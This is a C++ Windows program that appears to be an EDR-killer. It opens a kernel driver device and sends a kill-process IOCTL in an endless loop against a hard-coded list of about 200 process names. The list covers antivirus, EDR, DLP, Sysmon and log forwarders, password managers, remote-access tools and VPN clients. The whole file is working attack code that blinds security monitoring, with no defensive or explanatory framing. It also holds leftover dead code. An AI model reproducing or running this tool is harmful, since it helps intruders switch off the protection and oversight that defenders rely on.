#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <tlhelp32.h>
#include <wchar.h>

#define DEVICE_NAME L"\\\\.\\{F8284233-48F4-4680-ADDD-F8284233}"
#define IOCTL_KILL_PROCESS 0x22E010


// Function to find the PID of a process by its name
DWORD FindProcessId(const char* processName)
{
	size_t wcharCount = mbstowcs(NULL, processName, 0) + 1;
	wchar_t* wprocessName = (wchar_t*)malloc(wcharCount * sizeof(wchar_t));
	if(!wprocessName)
	{
		return 0;
	}
	mbstowcs(wprocessName, processName, wcharCount);

	DWORD processId = 0;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if(snapshot != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32W processEntry;
		processEntry.dwSize = sizeof(PROCESSENTRY32W);
		if(Process32FirstW(snapshot, &processEntry))
		{
			do
			{
				if(wcscmp(processEntry.szExeFile, wprocessName) == 0)
				{
					processId = processEntry.th32ProcessID;
					break;
				}
			} while(Process32NextW(snapshot, &processEntry));
		}
		CloseHandle(snapshot);
	}

	free(wprocessName);
	return processId;
}


int main(int argc, char* argv[])
{
	wchar_t imagePath[MAX_PATH];
	int result = 0;


	if(result != -1)
	{
		DWORD bytes_returned;
		// List of common EDR, AV, DLP, and remote access software processes to target (remove as needed because this list could be triggered by EDR)
		const char* edrNames[] =
		{
			"appcontrolagent.exe",                                  // Trend Micro Application Control Agent
			"arelliaacsvc.exe",                                     // Thycotic / Arellia Application Control
			"dax3api.exe",                                          // Dolby DAX API Service
			"elevoccontrolservice.exe",                             // Elevoc Audio Control Service
			"fmservice64.exe",                                      // Fortemedia APO Service
			"intelaudioservice.exe",                                // Intel Audio Service
			"rtkauduservice64.exe",                                 // Realtek Audio Universal Service
			"senaryaudioapp.svc.exe",                               // Senary Audio Service
			"aswidsagent.exe",                                      // Avast IDS Agent
			"avastsvc.exe",                                         // Avast AV Service
			"avastui.exe",                                          // Avast UI
			"avgnt.exe",                                            // Avira AV Guard UI
			"avguard.exe",                                          // Avira AV Guard
			"avp.exe",                                              // Kaspersky AV / KES
			"avpui.exe",                                            // Kaspersky UI
			"bdagent.exe",                                          // Bitdefender Agent
			"bdntwrk.exe",                                          // Bitdefender Network Protection
			"ccsvchst.exe",                                         // Symantec Endpoint Protection / Norton
			"clientcommunicationservice.exe",                       // Trend Micro Client Comm
			"clientlogservice.exe",                                 // Trend Micro Client Log
			"clientsolutionframework.exe",                          // Trend Micro Client Solution
			"coreserviceshell.exe",                                 // Trend Micro Core Service Shell
			"egui.exe",                                             // ESET NOD32 / Endpoint GUI
			"klwtblfs.exe",                                         // Kaspersky FS Filter
			"macmnsvc.exe",                                         // McAfee Agent Common Service
			"macompatsvc.exe",                                      // McAfee Agent Compatibility Service
			"masvc.exe",                                            // McAfee Agent Service
			"mcshield.exe",                                         // McAfee On-Access Scanner
			"mctray.exe",                                           // McAfee Agent Tray
			"mfemms.exe",                                           // McAfee Endpoint Security / Mgmt
			"mpdefendercoreservice.exe",                            // Microsoft Defender Core Service
			"msascuil.exe",                                         // Windows Defender UI
			"msmpeng.exe",                                          // Microsoft Defender Antivirus Engine
			"nortonsecurity.exe",                                   // Norton Security
			"ns.exe",                                               // Norton Security
			"nsservice.exe",                                        // Norton Security Service
			"ntrtscan.exe",                                         // Trend Micro Real-Time Scan
			"pavfnsvr.exe",                                         // Panda AV File Name Server
			"pavsrv.exe",                                           // Panda AV Service
			"realtimescanservice.exe",                              // Trend Micro RealTime Scan Service
			"rtvscan.exe",                                          // Symantec Endpoint Protection
			"samplingservice.exe",                                  // Trend Micro Sampling Service
			"savservice.exe",                                       // Sophos Endpoint / SAVService
			"shstat.exe",                                           // McAfee Status Monitor
			"sophosav.exe",                                         // Sophos Endpoint AV
			"sophosclean.exe",                                      // Sophos Clean
			"sophosui.exe",                                         // Sophos UI
			"tmlisten.exe",                                         // Trend Micro AV / Apex One Core
			"tmntsrv.exe",                                          // Trend Micro OfficeScan / Apex One
			"tmproxy.exe",                                          // Trend Micro Traffic Scanner / Proxy
			"updaterui.exe",                                        // McAfee Agent Updater UI
			"updatesrv.exe",                                        // Bitdefender Update Service
			"vsserv.exe",                                           // Bitdefender Virus Shield
			"windefend.exe",                                        // Microsoft Defender AV Service
			"wscservice.exe",                                       // Trend Micro Security Service
			"applephotostreams.exe",                                // Apple Photo Streams
			"apsdaemon.exe",                                        // Apple iCloud Push Daemon
			"box.exe",                                              // Box Desktop
			"boxdrive.exe",                                         // Box Drive
			"dropbox.exe",                                          // Dropbox Desktop
			"googledrivefs.exe",                                    // Google Drive for Desktop
			"icloudckks.exe",                                       // Apple iCloud CKKS
			"iclouddrive.exe",                                      // Apple iCloud Drive
			"icloudhome.exe",                                       // Apple iCloud Home
			"icloudoutlookconfig64.exe",                            // Apple iCloud Outlook Config
			"icloudphotos.exe",                                     // Apple iCloud Photos
			"icloudservices.exe",                                   // Apple iCloud Services
			"nextcloud.exe",                                        // Nextcloud Desktop
			"onedrive.exe",                                         // Microsoft OneDrive
			"secd.exe",                                             // Apple iCloud Security Daemon
			"1password.exe",                                        // 1Password
			"bitwarden.exe",                                        // Bitwarden
			"keepass.exe",                                          // KeePass Password Safe 2
			"keepassxc.exe",                                        // KeePassXC
			"dlpagent.exe",                                         // Symantec DLP Agent
			"dlpsensor.exe",                                        // McAfee DLP Sensor
			"dlpuseragent.exe",                                     // Microsoft Defender DLP User Agent
			"edpa.exe",                                             // McAfee DLP Agent
			"fcag.exe",                                             // McAfee/Trellix DLP Agent
			"fcags.exe",                                            // McAfee/Trellix DLP Agent Service
			"fcagswd.exe",                                          // McAfee/Trellix DLP Agent Watchdog
			"fcnm.exe",                                             // McAfee/Trellix DLP Network Monitor
			"fcom.exe",                                             // McAfee/Trellix DLP Orchestrator
			"mpdlpservice.exe",                                     // Microsoft Defender DLP Service
			"sensedlpprocessor.exe",                                // Microsoft Defender DLP Processor
			"intelcphdcpsvc.exe",                                   // Intel Content Protection HDCP Service
			"intelcphecisvc.exe",                                   // Intel Component Helper Service
			"csfalconcontainer.exe",                                // CrowdStrike Falcon Sensor Container
			"csfalcondaterepair.exe",                               // CrowdStrike Falcon Repair Component
			"csfalconservice.exe",                                  // CrowdStrike Falcon Sensor
			"cyserver.exe",                                         // Cortex XDR Agent (protected)
			"cyveraconsole.exe",                                    // Cortex XDR Console
			"cyveraservice.exe",                                    // Cortex XDR Service
			"cyvragentsvc.exe",                                     // Cortex XDR Agent Service
			"cyvrfsflt.exe",                                        // Cortex XDR FS Filter
			"ekrn.exe",                                             // ESET Kernel Service
			"elastic-agent.exe",                                    // Elastic Agent (Fleet)
			"elastic-endpoint.exe",                                 // Elastic Defend / Endpoint
			"endpoint-security.exe",                                // Elastic Endpoint Security Component
			"endpointbasecamp.exe",                                 // Trend Micro Endpoint Basecamp
			"firesvc.exe",                                          // FireEye Endpoint Agent Service
			"firetray.exe",                                         // FireEye Endpoint Agent Tray
			"ir_agent.exe",                                         // Rapid7 Insight Agent
			"mssense.exe",                                          // Microsoft Defender for Endpoint (MDE/ATP)
			"psanhost.exe",                                         // Panda Advanced Protection Host
			"sentinelagent.exe",                                    // SentinelOne Agent
			"sentinelctl.exe",                                      // SentinelOne Control CLI
			"sentinelhelperservice.exe",                            // SentinelOne Helper Service
			"sentinelmemoryscanner.exe",                            // SentinelOne Memory Scanner
			"sentinelservicehost.exe",                              // SentinelOne Service Host
			"sentinelstaticengine.exe",                             // SentinelOne Static Engine
			"sentinelstaticenginescanner.exe",                      // SentinelOne Static Engine Scanner
			"sentinelui.exe",                                       // SentinelOne UI
			"sophossps.exe",                                        // SophosSps (Exploit Mitigation / Endpoint Defense)
			"tanclient.exe",                                        // Tanium EDR Client (legacy)
			"taniumclient.exe",                                     // Tanium Client
			"traps.exe",                                            // Cortex XDR (Traps)
			"trapsagent.exe",                                       // Cortex XDR (Traps Agent)
			"trapsd.exe",                                           // Cortex XDR Daemon
			"wrsa.exe",                                             // Webroot SecureAnywhere
			"xagt.exe",                                             // FireEye Endpoint Agent / Trellix HX
			"axcrypt.exe",                                          // AxCrypt
			"eegoservice.exe",                                      // McAfee Endpoint Encryption Service
			"epepcmonitor.exe",                                     // McAfee Endpoint Encryption PC Monitor
			"mdecryptservice.exe",                                  // McAfee Encryption Decrypt Service
			"mfeepehost.exe",                                       // McAfee Endpoint Encryption Host
			"toast32.exe",                                          // McAfee Endpoint Encryption Notification
			"truecrypt.exe",                                        // TrueCrypt
			"fw.exe",                                               // Check Point Firewall
			"mfemactl.exe",                                         // McAfee ES Firewall Controller
			"personalfirewallservice.exe",                          // Trend Micro Personal Firewall
			"igfxcuiservice.exe",                                   // Intel Graphics CUI Service
			"igfxem.exe",                                           // Intel Graphics EM
			"oneapp.igcc.winservice.exe",                           // Intel Graphics Command Center Service
			"hips.exe",                                             // Host Intrusion Prevention System
			"mfefire.exe",                                          // McAfee HIPS / Firewall
			"sgrmbroker.exe",                                       // Windows System Guard Runtime Monitor Broker
			"healthservice.exe",                                    // Microsoft OMS / SCOM HealthService
			"monitoringhost.exe",                                   // Microsoft Monitoring Agent
			"npmdagent.exe",                                        // SolarWinds NPM Agent
			"synrpcserver.exe",                                     // Synology Assistant RPC Service
			"sensendr.exe",                                         // Microsoft Defender NDR component
			"dockmgr.exe",                                          // Lenovo Dock Manager
			"dockmgr.svc.exe",                                      // Lenovo Dock Manager Service
			"easyresume.exe",                                       // Lenovo Instant On / EasyResume
			"epdctrl.exe",                                          // Lenovo ePrivacy Display Control
			"epdservice.exe",                                       // Lenovo ePrivacy Display Service
			"esif_uf.exe",                                          // Intel Dynamic Platform & Thermal Framework
			"ibmpmsvc.exe",                                         // Lenovo Power Management Service
			"ipf_helper.exe",                                       // Intel Platform Framework Helper
			"ipf_uf.exe",                                           // Intel Platform Framework User-Mode
			"ipfsvc.exe",                                           // Intel Platform Framework Service
			"jhi_service.exe",                                      // Intel Dynamic Application Loader (HECI)
			"lenovoaiccloader.exe",                                 // Lenovo AI Core Components
			"lenovovisionservice.exe",                              // Lenovo Vision Service
			"litssvc.exe",                                          // Lenovo Intelligent Thermal Solution
			"lms.exe",                                              // Intel AMT Local Management Service
			"powermgr.exe",                                         // Lenovo Power Manager
			"shtctky.exe",                                          // Lenovo Hotkeys
			"smartstandby.exe",                                     // Lenovo Smart Standby
			"syntpenh.exe",                                         // Synaptics TouchPad Enhancements
			"syntpenhservice.exe",                                  // Synaptics TouchPad Service
			"tphkload.exe",                                         // Lenovo Hotkey Loader
			"tposd.exe",                                            // Lenovo On-Screen Display
			"cpd.exe",                                              // Check Point Daemon
			"mdnsresponder.exe",                                    // Bonjour Service
			"nssm.exe",                                             // NSSM (Non-Sucking Service Manager)
			"panda_url_filtering.exe",                              // Panda URL Filtering
			"rtocustodio.exe",                                      // Vintegris ModuloM Security Agent
			"rtosecstartsrv.exe",                                   // Vintegris ModuloM Security Service
			"sbiesvc.exe",                                          // Sandboxie Service
			"securityhealthservice.exe",                            // Windows Security Health Service
			"securityhealthsystray.exe",                            // Windows Security Systray
			"senseir.exe",                                          // Microsoft Defender IR component
			"smsvchost.exe",                                        // Microsoft .NET Framework service host
			"arellia.agent.service.exe",                            // Thycotic / Arellia PAM Agent
			"msra.exe",                                             // Windows Remote Assistance
			"msrdc.exe",                                            // Microsoft Remote Desktop Client (Modern)
			"mstsc.exe",                                            // Microsoft Remote Desktop Client
			"cmrcservice.exe",                                      // ConfigMgr Remote Control Service
			"quickassist.exe",                                      // Microsoft Quick Assist
			"teamviewer.exe",                                       // TeamViewer Client
			"teamviewer_service.exe",                               // TeamViewer Service
			"trc_base.exe",                                         // IBM Tivoli Remote Control Service
			"trc_gui.exe",                                          // IBM Tivoli Remote Control GUI
			"tv_w32.exe",                                           // TeamViewer Helper (32-bit)
			"tv_x64.exe",                                           // TeamViewer Helper (64-bit)
			"tbtp2pshortcutservice.exe",                            // Intel Thunderbolt P2P Shortcut Service
			"thunderboltservice.exe",                               // Intel Thunderbolt Service
			"nxlog.exe",                                            // nxlog Log Forwarder
			"sophoshealth.exe",                                     // Sophos Health
			"sysmon.exe",                                           // Microsoft Sysmon
			"sysmon64.exe",                                         // Microsoft Sysmon (64-bit)
			"telemetryagentservice.exe",                            // Trend Micro Telemetry Agent
			"telemetryservice.exe",                                 // Trend Micro Telemetry Service
			"winlogbeat.exe",                                       // Elastic Winlogbeat (log forwarder)
			"aesm_service.exe",                                     // Intel SGX AESM Service
			"ccmexec.exe",                                          // Microsoft SCCM Client
			"dcagentservice.exe",                                   // ManageEngine Endpoint Central Agent
			"dcinventory.exe",                                      // ManageEngine Inventory Component
			"dcondemand.exe",                                       // ManageEngine On-Demand Agent
			"dcprocessmonitor.exe",                                 // ManageEngine Process Monitor
			"dcprocmon.exe",                                        // ManageEngine Process Monitor (alt)
			"dcswmeter.exe",                                        // ManageEngine Software Metering
			"microsoft.management.services.intunewindowsagent.exe", // Microsoft Intune Management Agent
			"scnotification.exe",                                   // Microsoft SCCM Notification
			"uesagentservice.exe",                                  // ManageEngine Unified Endpoint Security Agent
			"ipoverusbsvc.exe",                                     // Microsoft IP over USB
			"ss_conn_service.exe",                                  // Samsung USB Driver Service
			"ss_conn_service2.exe",                                 // Samsung USB Driver Service (alt)
			"vgauthservice.exe",                                    // VMware VGAuthService
			"vm3dservice.exe",                                      // VMware 3D Service
			"vmnat.exe",                                            // VMware NAT Service
			"vmnetdhcp.exe",                                        // VMware DHCP Service
			"vmtoolsd.exe",                                         // VMware Tools Daemon
			"vmware-authd.exe",                                     // VMware Authorization Service
			"vmware-tray.exe",                                      // VMware Tray
			"vmware-usbarbitrator64.exe",                           // VMware USB Arbitration Service
			"wsl.exe",                                              // Windows Subsystem for Linux
			"wslhost.exe",                                          // Windows Subsystem for Linux Host
			"wslservice.exe",                                       // Windows Subsystem for Linux Service
			"concentr.exe",                                         // Palo Alto Networks GlobalProtect
			"csc_ui.exe",                                           // Cisco Secure Client UI
			"fortitray.exe",                                        // Fortinet FortiClient / FortiTray
			"fortivpn.exe",                                         // Fortinet FortiClient VPN
			"ksde.exe",                                             // Kaspersky Secure Connection
			"ksdeui.exe",                                           // Kaspersky Secure Connection
			"openvpn-gui.exe",                                      // OpenVPN GUI
			"openvpnserv.exe"                                       // OpenVPN
		};

		const size_t edrCount = sizeof(edrNames) / sizeof(edrNames[0]);

		char inputBuffer[16];
        sprintf_s(inputBuffer, sizeof(inputBuffer), "%d", 2188); 

        HANDLE hDevice = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (hDevice == INVALID_HANDLE_VALUE) {
            printf("[-] Error while opening device: %lu\n", GetLastError());
            return 1;
        }

        char outputBuffer[8] = {0};
        DWORD bytesReturned = 0;

		printf("[+] Handle opened: 0x%p\n", hDevice);

		while(true)
		{
			for(size_t i = 0; i < edrCount; i++)
			{
				DWORD pid = FindProcessId(edrNames[i]);
                sprintf_s(inputBuffer, sizeof(inputBuffer), "%d", pid);
				if(pid > 0)
				{
					printf("[+] Trying to Kill the Process with PID : %d\n", pid);
					BOOL success = DeviceIoControl(
                        hDevice,
                        IOCTL_KILL_PROCESS,
                        inputBuffer,
                        strlen(inputBuffer) + 1,
                        outputBuffer,
                        sizeof(outputBuffer),
                        &bytesReturned,
                        nullptr
                    );
					if(success && strcmp(outputBuffer, "ok") == 0)
					{
						printf("[+] Process with PID %d killed successfully for process %s\n", pid, edrNames[i]);
					}
					else
					{
						printf("[-] Failed to kill process with PID %d\n", pid);
                        return 1;
					}

				}
				else
				{
					printf("[-] Process %s not found\n", edrNames[i]);
				}
			}

		}

		CloseHandle(hDevice);
		return 0;
	}
	printf("[+] Error while querying/creating key\n");
	return EXIT_FAILURE;
}

